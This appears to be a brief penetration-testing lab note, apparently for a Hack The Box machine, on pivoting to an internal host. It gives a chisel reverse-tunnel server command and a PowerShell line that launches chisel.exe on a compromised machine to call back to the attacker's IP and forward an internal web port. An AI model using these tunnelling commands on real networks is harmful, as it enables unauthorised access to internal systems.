# Traverse (target 172.23.240.1 - AD?)
* listener on attacker
`chisel server -p 8081 --reverse`
* when in shell you will need chisel.exe
`start-process -filepath "C:\temp\ch.exe" -argumentlist "client 10.10.14.5:8081 R:8083:172.23.240.1:80"`
* /etc/hosts has 127.0.0.1 softwareportal.windcorp.htb
* Browser to http://softwareportal.windcorp.htb:8083 and good
